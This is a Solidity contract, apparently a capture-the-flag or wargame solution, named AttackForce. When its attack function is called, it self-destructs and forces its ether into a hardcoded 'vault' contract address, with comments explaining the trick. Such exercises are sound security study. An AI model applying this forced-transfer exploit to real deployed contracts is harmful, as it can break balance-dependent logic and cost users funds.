// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackForce {
    // Self destruct works by transferring all current Eth in this contract to another address, followed by 0-ing all the storage in this address.
    // We can create a contract with some eth in it, then have a fn that calls self-destruct and points it to the vault contract.
    address payable vaultContractAddress = payable(0xd2B933BA9b321074FfF238268F6Dc7Dce6b052EE);
    constructor() payable {  }
    function attack() public {
        selfdestruct(vaultContractAddress);
    }
}